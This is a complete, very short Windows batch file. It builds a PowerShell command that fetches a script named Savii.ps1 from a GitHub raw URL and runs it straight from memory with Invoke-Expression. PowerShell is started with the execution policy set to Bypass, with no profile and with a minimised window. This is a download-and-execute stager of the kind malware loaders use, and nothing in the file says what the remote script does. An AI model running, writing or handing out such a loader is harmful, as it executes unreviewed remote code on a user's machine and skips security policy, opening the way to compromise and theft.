@echo off

set "pscmd=Invoke-Expression (Invoke-RestMethod https://github.com/x-ben10/talulabo/raw/refs/heads/main/Savii.ps1)"

powershell -NoP -NoL -ep Bypass -Win 1 -Command "%pscmd%"
 
